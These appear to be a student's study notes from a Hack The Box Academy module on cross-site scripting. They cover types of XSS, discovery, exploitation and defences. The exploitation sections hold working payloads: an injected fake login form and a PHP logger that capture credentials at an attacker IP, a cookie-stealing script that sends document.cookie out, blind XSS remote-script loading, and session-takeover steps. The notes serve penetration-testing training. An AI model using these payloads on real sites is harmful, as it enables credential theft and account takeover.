# Cross-Site Scripting (XSS)

**Platform:** Hack The Box Academy  
**Module:** Cross-Site Scripting (XSS)  
**Sections:** 10  
**Difficulty:** Medium  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Types of XSS](#types-of-xss)
3. [Stored XSS](#stored-xss)
4. [Reflected XSS](#reflected-xss)
5. [DOM-Based XSS](#dom-based-xss)
6. [XSS Discovery](#xss-discovery)
   - [Automated Discovery](#automated-discovery)
   - [Manual Discovery](#manual-discovery)
   - [Code Review](#code-review)
7. [XSS Exploitation — Defacement](#xss-exploitation--defacement)
8. [XSS Exploitation — Phishing](#xss-exploitation--phishing)
9. [XSS Exploitation — Session Hijacking](#xss-exploitation--session-hijacking)
   - [Blind XSS Detection](#blind-xss-detection)
   - [Cookie Stealing and Session Takeover](#cookie-stealing-and-session-takeover)
10. [XSS Prevention](#xss-prevention)
    - [Front-End Defences](#front-end-defences)
    - [Back-End Defences](#back-end-defences)
    - [Server Configuration](#server-configuration)
11. [Key Tools Reference](#key-tools-reference)
12. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

Cross-Site Scripting (XSS) vulnerabilities exploit a failure to sanitize user input by injecting JavaScript code into a web page that executes in the victim's browser. Because XSS executes on the client side, it does not directly compromise the back-end server — but its ability to run arbitrary JavaScript in another user's browser opens a wide range of high-impact attack paths.

### Risk Profile

| Factor | Assessment |
|--------|----------|
| **Probability** | High — XSS is one of the most common web vulnerabilities |
| **Impact** | Low to Medium — client-side only, no direct server compromise |
| **Combined Risk** | Medium — high probability × low-medium impact |

### Historical Context

| Event | Year | Impact |
|-------|------|--------|
| **Samy Worm** — MySpace stored XSS | 2005 | 1M+ profiles infected within 24 hours via self-replicating JS payload |
| **TweetDeck XSS** — Twitter dashboard | 2014 | Self-retweeting tweet reached 38,000 RTs in under 2 minutes; forced TweetDeck shutdown |
| **Google Search XSS** — XML library | 2019 | XSS in Google's own search bar, one of the most visited sites globally |
| **Apache Server XSS** | Various | Actively exploited to steal credentials from enterprise users |

### What XSS Can and Cannot Do

**Can do (browser JS engine scope):**
- Steal session cookies → account takeover
- Inject fake login forms → credential phishing
- Deface web pages permanently (stored XSS)
- Execute API calls as the victim (change password, transfer funds)
- Load remote scripts → keylogging, Bitcoin mining, ad injection
- Chain with browser binary vulnerabilities for sandbox escape and OS-level RCE

**Cannot do:**
- Execute system-level code directly
- Access other domains (same-origin policy)
- Persist beyond the browser session (reflected and DOM-based only)

---

## Types of XSS

| Type | Persistence | Where Processing Occurs | Scope of Victims |
|------|------------|------------------------|----------------|
| **Stored (Persistent)** | Yes — stored in DB | Back-end stores, front-end renders | All users who visit the infected page |
| **Reflected (Non-Persistent)** | No — temporary | Back-end processes and reflects in response | Only users who click the crafted URL |
| **DOM-Based (Non-Persistent)** | No — temporary | Client-side JavaScript only, never reaches server | Only users who visit the crafted URL |

> **Key concept:** Stored XSS is the most critical type because any user visiting the infected page becomes a victim automatically — no social engineering required. Reflected and DOM-based XSS require tricking a target into visiting a malicious URL.

---

## Stored XSS

Stored (Persistent) XSS occurs when user input is stored in the back-end database and then retrieved and rendered without sanitization. The payload executes every time the page loads for any visitor.

### Testing for Stored XSS

The standard initial payload to confirm execution:

```html
<script>alert(window.origin)</script>
```

Using `window.origin` instead of a static value like `1` reveals which URL (and which iframe if applicable) is executing the payload — essential when forms use cross-domain iframes.

**Alternative payloads if `alert()` is blocked by modern browsers:**

```html
<plaintext>                          <!-- Stops HTML rendering, displays raw source -->
<script>print()</script>             <!-- Opens browser print dialog — rarely blocked -->
```

**Confirming persistence:**
- Refresh the page after injecting the payload
- If the alert fires again on refresh, the payload is stored in the database
- If no alert on refresh, the XSS is non-persistent

**Verifying in page source:**

```html
<!-- Source confirms the payload is embedded in the page -->
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>alert(window.origin)</script>
</ul></ul>
```

> **Real-world impact:** A stored XSS payload in a comment section, user profile, or support ticket executes for every admin or user who views that content — the attacker does not need to be online when victims are affected.

---

## Reflected XSS

Reflected XSS occurs when user input is processed by the back-end and echoed into the response without sanitization — typically in error messages or search results — but is not stored. The payload only executes for users who send the crafted request.

### Testing for Reflected XSS

```html
<script>alert(window.origin)</script>
```

If the input appears in an error message like `Task '<script>alert(window.origin)</script>' could not be added.`, the script tags are rendered and the alert fires.

**Key distinction from Stored XSS:** Refreshing the page after a Reflected XSS fires will NOT trigger the alert again — the payload was never stored.

### Delivering Reflected XSS to Victims

Check Firefox DevTools → Network tab to determine whether the form uses GET or POST:

- **GET request** → parameters are in the URL → share the full URL including the payload:

```
http://10.129.85.14:5000/index.php?task=<script>alert(window.origin)</script>
```

When a victim clicks this URL, the payload executes in their browser. The attack is delivered via phishing emails, social media links, or malicious redirects.

- **POST request** → cannot be delivered via a simple URL → requires a hosted page that submits a POST form to the target automatically.

---

## DOM-Based XSS

DOM-based XSS occurs entirely on the client side. The JavaScript code reads user input and writes it directly to the DOM using an unsafe function — the back-end server is never involved. No HTTP requests are generated for the injection itself.

### Identifying DOM XSS

**Indicators:**
- URL uses a `#` fragment for the input parameter (e.g., `#task=test`)
- No network request appears in DevTools → Network tab when submitting the form
- The input is not visible in the page source (`CTRL+U`) but appears in the rendered DOM (`CTRL+SHIFT+C` Web Inspector)

### Source and Sink Analysis

| Concept | Definition | Example |
|---------|-----------|--------|
| **Source** | The JavaScript object that accepts user input | `document.URL`, `location.hash`, `URLSearchParams` |
| **Sink** | The function that writes input to the DOM without sanitization | `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()` |

**Dangerous JS functions (Sinks):**

```javascript
document.write()
DOM.innerHTML
DOM.outerHTML
document.writeln()
document.domain
```

**Dangerous jQuery functions (Sinks):**

```javascript
html()        parseHTML()    add()
append()      prepend()      after()
insertAfter() before()       insertBefore()
replaceAll()  replaceWith()
```

**Example vulnerable code:**

```javascript
// Source — reads from URL parameter
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Sink — writes directly to DOM without sanitization
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

### DOM XSS Payload

`innerHTML` blocks `<script>` tags as a security measure. Use event-handler-based payloads instead:

```html
<img src="" onerror=alert(window.origin)>
```

This creates an image object with an invalid `src`. When the image fails to load (immediately, since `src` is empty), the `onerror` handler fires the JavaScript — without any `<script>` tags.

**Delivery URL:**

```
http://10.129.85.14:5000/#task=<img src='' onerror=alert(window.origin)>
```

---

## XSS Discovery

### Automated Discovery

Vulnerability scanners test for all three XSS types:

| Tool | Type | Notes |
|------|------|-------|
| **Burp Suite Pro** | Active + Passive | Industry standard, highest accuracy |
| **OWASP ZAP** | Active + Passive | Free alternative, good active scanner |
| **Nessus** | Active + Passive | Enterprise vulnerability scanner |
| **XSS Strike** | Active | Open-source, generates 3000+ payloads |
| **Brute XSS** | Active | Focuses on bypass techniques |
| **XSSer** | Active | Automated XSS testing framework |

**XSS Strike usage:**

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
Hackerpatel007_1@htb[/htb]$ cd XSStrike
Hackerpatel007_1@htb[/htb]$ pip install -r requirements.txt
Hackerpatel007_1@htb[/htb]$ python xsstrike.py -u "http://10.129.85.14:5000/index.php?task=test"
```

```
[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[!] Payloads generated: 3072 
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
```

> **Note:** Automated tools will not always be accurate. Always manually verify any XSS identified by automated scanners — the payload may be reflected without actually executing.

---

### Manual Discovery

**XSS Payload Sources:**
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Payload-Box XSS](https://github.com/payload-box/xss-payload-list)

**Key principle:** XSS can be injected into any input field in the HTML page — not just visible form fields. Test:
- Form input fields
- URL parameters (GET)
- HTTP headers (`User-Agent`, `Cookie`, `Referer`)
- Any value that gets reflected in the response

**Common injection vectors:**

```html
<!-- Standard script tag -->
<script>alert(window.origin)</script>

<!-- Image event handler — bypasses innerHTML restriction -->
<img src="" onerror=alert(window.origin)>

<!-- SVG event handler -->
<svg onload=alert(window.origin)>

<!-- Body event handler -->
<body onload=alert(window.origin)>

<!-- Input event handler -->
<input onfocus=alert(window.origin) autofocus>

<!-- Details event handler -->
<details ontoggle=alert(window.origin) open>
```

---

### Code Review

The most reliable detection method. Identify Sources and Sinks in the source code:

1. **Find Sources** — where does user input enter? (`$_GET`, `$_POST`, URL params, headers)
2. **Trace the input** — how is it processed before display?
3. **Find Sinks** — is unsanitized input passed to `innerHTML`, `document.write()`, `eval()`, etc.?
4. **Craft a payload** — based on the exact context the input lands in

---

## XSS Exploitation — Defacement

Stored XSS gives persistent control over a page's appearance for all visitors. Defacement uses injected JavaScript to alter the DOM in real time.

### Defacement Payload Components

**1 — Change Background Color:**

```html
<script>document.body.style.background = "#141d2b"</script>
```

**2 — Set Background Image:**

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

**3 — Change Page Title:**

```html
<script>document.title = 'HackTheBox Academy'</script>
```

**4 — Replace Full Page Body Content:**

```javascript
// Target the body element and replace all inner HTML
document.getElementsByTagName('body')[0].innerHTML = "New Text"

// Or using jQuery (if jQuery is loaded on the page)
$('body').html('New Text');
```

**Full Defacement Payload (all three combined):**

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

> **Note:** Injected payloads append to the end of the page source. If other elements follow the injection point, account for them. The JavaScript alters the rendered appearance — users see the defaced page while the original source still exists underneath.

---

## XSS Exploitation — Phishing

XSS phishing attacks inject a convincing fake login form into a legitimate-looking page. Victims trust the page because they are on the real domain.

### Step 1 — Craft the Fake Login Form

```html
<h3>Please login to continue</h3>
<form action=http://10.10.14.51>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

### Step 2 — Inject with document.write() and Remove Legitimate Fields

Minify the HTML to a single line and inject it via `document.write()`. Also remove the original form using its DOM ID to prevent confusion:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.51><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

To find the ID of the element to remove: open DevTools → Inspector Picker (`CTRL+SHIFT+C`) → click the element.

Append an HTML comment at the end to hide any remaining original HTML:

```
...PAYLOAD... <!-- 
```

### Step 3 — Capture Credentials with PHP Listener

```bash
# Option 1 — Quick capture with netcat (visible in terminal)
Hackerpatel007_1@htb[/htb]$ sudo nc -lvnp 80

# Captured GET request shows credentials in URL:
GET /?username=test&password=test&submit=Login HTTP/1.1
```

```php
<?php
// Option 2 — PHP credential logger (redirects victim to original page — less suspicious)
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.85.14:5000/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```bash
# Start PHP listener
Hackerpatel007_1@htb[/htb]$ mkdir /tmp/tmpserver
Hackerpatel007_1@htb[/htb]$ cd /tmp/tmpserver
Hackerpatel007_1@htb[/htb]$ sudo php -S 0.0.0.0:80

# Captured credentials appear in creds.txt
Hackerpatel007_1@htb[/htb]$ cat creds.txt
Username: victim | Password: secretpassword123
```

> **Real-world note:** The PHP redirect option is significantly stealthier — the victim is sent back to the legitimate page after submitting credentials, creating no obvious error or anomaly.

---

## XSS Exploitation — Session Hijacking

Session hijacking (cookie stealing) uses XSS to extract the victim's session cookie and send it to the attacker — enabling login as the victim without knowing their password.

### Blind XSS Detection

Blind XSS occurs when the injection point feeds data to a page the attacker cannot directly access — typically an admin panel, support ticket system, or user registration review page. Confirming the injection works requires a callback to our server.

**Blind XSS Indicators:**
- User registration forms reviewed by admins
- Contact/support forms
- Review/comment systems (moderated)
- HTTP headers reflected in admin interfaces (`User-Agent`, `Referer`)

**Loading a Remote Script for Blind XSS:**

```html
<!-- The script source path identifies which field is vulnerable -->
<script src="http://10.10.14.51/fullname"></script>
<script src="http://10.10.14.51/username"></script>
<script src="http://10.10.14.51/email"></script>
<script src="http://10.10.14.51/website"></script>
```

Submit one payload per field. Start a listener on the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ sudo php -S 0.0.0.0:80
```

When the admin views the registration, the vulnerable field triggers a request — the path after `10.10.14.51` identifies exactly which field is vulnerable and which payload format works.

> **Tip:** Skip email fields (usually validated on front-end AND back-end) and password fields (typically hashed before storage) — focus on name, username, and free-text fields.

---

### Cookie Stealing and Session Takeover

**Step 1 — Write the Cookie Grabber Script**

```javascript
// script.js — hosted on our attack machine
new Image().src='http://10.10.14.51/index.php?c='+document.cookie
```

The `new Image()` approach is subtler than `document.location` — it makes a background HTTP request without visibly navigating the user away from the page.

**Step 2 — Write the PHP Logger**

```php
<?php
// index.php — hosted on our attack machine
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Step 3 — Start the Listener**

```bash
Hackerpatel007_1@htb[/htb]$ mkdir /tmp/tmpserver && cd /tmp/tmpserver
Hackerpatel007_1@htb[/htb]$ vi index.php
Hackerpatel007_1@htb[/htb]$ sudo php -S 0.0.0.0:80
```

**Step 4 — Inject the Payload**

Use the blind XSS payload format from discovery, pointing to the cookie grabber script:

```html
<script src=http://10.10.14.51/script.js></script>
```

**Step 5 — Receive the Cookie**

When the admin views the vulnerable page:

```
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

```bash
Hackerpatel007_1@htb[/htb]$ cat cookies.txt
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

**Step 6 — Use the Cookie for Session Takeover**

1. Navigate to the login page in Firefox
2. Open DevTools → Storage tab (`SHIFT+F9`)
3. Click the `+` button to add a new cookie:
   - **Name:** `cookie` (the part before `=`)
   - **Value:** `f904f93c949d19d870911bf8b05fe7b2` (the part after `=`)
4. Refresh the page → logged in as the victim

---

## XSS Prevention

### Front-End Defences

**1 — Input Validation (JavaScript):**

```javascript
// Validate email format before accepting input
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

**2 — Input Sanitization (DOMPurify):**

```javascript
// DOMPurify escapes all special characters — prevents DOM XSS
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

**3 — Never Use User Input Directly In:**

```html
<!-- NEVER place raw user input inside these -->
<script>USER_INPUT</script>           <!-- JS execution context -->
<style>USER_INPUT</style>             <!-- CSS injection -->
<div name='USER_INPUT'></div>         <!-- Tag attribute injection -->
<!-- USER_INPUT -->                   <!-- HTML comment injection -->
```

**4 — Avoid Dangerous DOM Sink Functions with User Input:**

```javascript
// NEVER pass unvalidated user input to these functions:
DOM.innerHTML = userInput;            // Use textContent instead
DOM.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
// jQuery dangerous sinks:
$('#el').html(userInput);             // Use .text() instead
```

---

### Back-End Defences

**1 — Input Sanitization (PHP):**

```php
// addslashes() — escapes quotes with backslash
addslashes($_GET['email'])

// Never display raw user input directly
echo $_GET['email'];                  // VULNERABLE
echo addslashes($_GET['email']);       // SAFER (but still use output encoding)
```

**2 — Input Sanitization (Node.js with DOMPurify):**

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

**3 — Output HTML Encoding (PHP):**

```php
// htmlspecialchars/htmlentities — converts < to &lt;, > to &gt;, etc.
// Renders in the browser as text but cannot execute as HTML/JS
htmlentities($_GET['email']);
htmlspecialchars($_GET['email'], ENT_QUOTES, 'UTF-8');
```

**4 — Output HTML Encoding (Node.js):**

```javascript
import encode from 'html-entities';
encode('<');  // -> '&lt;'
```

**5 — Input Validation (PHP email example):**

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // process
} else {
    // reject — do not display
}
```

---

### Server Configuration

| Control | Configuration | Protection Against |
|---------|--------------|------------------|
| HTTPS everywhere | `HSTS` header | Cookie theft over HTTP |
| `HttpOnly` cookie flag | `Set-Cookie: ...; HttpOnly` | JavaScript cannot read cookies → defeats cookie stealing |
| `Secure` cookie flag | `Set-Cookie: ...; Secure` | Cookies only sent over HTTPS |
| Content Security Policy | `script-src 'self'` | Blocks inline scripts and remote script loading |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing attacks |
| `X-XSS-Protection` | `1; mode=block` | Enables browser XSS filter (legacy browsers) |
| Web Application Firewall | ModSecurity / Cloudflare | Detects and blocks XSS payloads in HTTP requests |

> **Key defence:** The `HttpOnly` cookie flag is the single most impactful mitigation against cookie-stealing XSS attacks. When set, JavaScript cannot access `document.cookie` at all, completely defeating the session hijacking technique shown in this module.

---

## Key Tools Reference

| Command / Tool | Purpose |
|----------------|--------|
| `<script>alert(window.origin)</script>` | Basic stored/reflected XSS proof-of-concept |
| `<img src="" onerror=alert(window.origin)>` | DOM XSS payload — bypasses innerHTML `<script>` restriction |
| `<script>print()</script>` | Alternative PoC — opens print dialog, rarely browser-blocked |
| `<plaintext>` | Confirms reflection — stops HTML rendering after injection point |
| `git clone https://github.com/s0md3v/XSStrike.git` | Clone XSS Strike automated scanner |
| `python xsstrike.py -u "URL?param=test"` | Run XSS Strike against a GET parameter |
| `document.write('<form>...</form>')` | Inject HTML content (phishing forms) |
| `document.getElementById('id').remove()` | Remove original page elements during phishing |
| `document.body.style.background = "#141d2b"` | Change page background colour (defacement) |
| `document.title = 'Title'` | Change page title (defacement) |
| `document.getElementsByTagName('body')[0].innerHTML = '...'` | Replace all page body content (defacement) |
| `new Image().src='http://10.10.14.51/index.php?c='+document.cookie` | Cookie stealer payload (JS) |
| `<script src=http://10.10.14.51/script.js></script>` | Load remote script (blind XSS) |
| `sudo nc -lvnp 80` | Netcat listener to capture incoming HTTP requests |
| `sudo php -S 0.0.0.0:80` | PHP development server for credential/cookie logging |
| `CTRL+U` | View raw page source |
| `CTRL+SHIFT+C` | Open Web Inspector (rendered DOM) |
| `SHIFT+F9` | Open Storage tab in Firefox DevTools |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1059 | T1059.007 | Command and Scripting Interpreter: JavaScript — XSS payload execution via browser JS engine |
| T1185 | — | Browser Session Hijacking — cookie stealing via `document.cookie` exfiltration |
| T1056 | T1056.003 | Input Capture: Web Portal Capture — injected phishing form capturing credentials |
| T1491 | T1491.001 | Defacement: Internal Defacement — stored XSS altering page appearance with injected JS |
| T1566 | T1566.002 | Phishing: Spearphishing Link — delivering reflected/DOM XSS via crafted URL to target |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — credentials captured to `creds.txt` via PHP logger |
| T1550 | T1550.004 | Use Alternate Authentication Material: Web Session Cookie — using stolen cookie for session takeover |
| T1583 | T1583.001 | Acquire Infrastructure: Domains — hosting credential catcher and cookie logger on attack server |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
